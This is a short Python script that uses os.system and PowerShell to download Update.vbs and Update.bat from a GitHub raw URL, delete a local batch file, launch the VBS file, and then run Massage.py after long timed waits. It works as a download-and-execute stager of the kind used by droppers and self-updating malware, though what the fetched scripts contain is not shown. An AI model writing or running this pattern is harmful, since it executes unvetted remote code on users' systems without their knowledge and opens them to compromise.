import os
import sys

os.system("timeout /t 10")
os.system('powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/Update.vbs -OutFile Update.vbs"')
os.system("timeout /t 5")
os.system("del Update.bat")
os.system('powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/Update.bat -OutFile Update.bat"')
os.system("timeout /t 5")
os.system("start Update.vbs")
os.system("timeout /t 5")
os.system("timeout /t 900")
os.system("Massage.py")
